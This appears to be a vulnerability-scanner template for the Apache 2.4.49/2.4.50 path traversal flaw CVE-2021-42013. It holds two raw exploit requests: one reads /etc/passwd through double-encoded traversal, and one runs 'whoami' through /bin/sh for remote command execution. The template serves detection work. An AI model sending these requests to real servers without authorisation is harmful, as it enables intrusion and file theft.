id: apache-path-traversal-cve-2021-42013

info:
  name: Apache 2.4.49/2.4.50 Path Traversal (CVE-2021-42013)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Apache HTTP Server versions 2.4.49 and 2.4.50 are vulnerable to a path traversal issue that allows attackers to map URLs to files outside the expected document root. This vulnerability could potentially expose sensitive files and lead to remote code execution.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-41773
    - https://httpd.apache.org/security/vulnerabilities_24.html
  tags: path-traversal, apache

http:
  - raw:
      - |
        GET /icons/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip, deflate
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:x:0:0:"

  - raw:
      - |
        POST /cgi-bin/.%252e/.%252e/.%252e/.%252e/.%252e/bin/sh HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 45
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip, deflate
        Connection: close

        echo Content-Type: text/plain; echo; whoami

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "^[a-zA-Z0-9._-]+$"
